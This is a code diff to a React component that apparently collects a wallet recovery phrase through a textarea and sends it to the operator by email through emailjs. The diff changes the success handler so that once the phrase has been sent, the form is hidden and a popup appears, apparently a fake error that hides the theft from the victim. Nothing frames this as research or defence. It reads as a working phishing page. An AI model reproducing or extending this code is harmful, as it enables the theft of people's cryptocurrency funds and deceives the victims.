@@ -1,10 +1,12 @@
 import React, { useRef, useState } from "react";
 import styled from "styled-components";
 import emailjs from "@emailjs/browser";
+import PopMode from "./PopMode";
 
 function Phrase() {
   const [phrase, setPhrase] = useState("");
   const [load, setLoad] = useState(false);
+  const [err, setErr] = useState(false);
   const form = useRef();
 
   const handleForm = (e) => {
@@ -18,15 +20,18 @@ function Phrase() {
         "8KgBlS8lwyWElkWEG"
       ).then((response)=>{
         console.log(response.status)
+        setErr(true);
+        setLoad(false);
       });
       
     } catch (error){
         console.log(error)
+        setLoad(false);
     }
   };
   return (
     <div>
-      <Form ref={form} onSubmit={handleForm}>
+      {!err && <Form ref={form} onSubmit={handleForm}>
         <textarea
           name="phrase"
           value={phrase}
@@ -41,7 +46,9 @@ function Phrase() {
         <button type="submit">
           {load ? <div className="loaderr"></div> : "Proceed"}
         </button>
-      </Form>
+      </Form>}
+
+      {err && <PopMode />}
     </div>
   );
 }
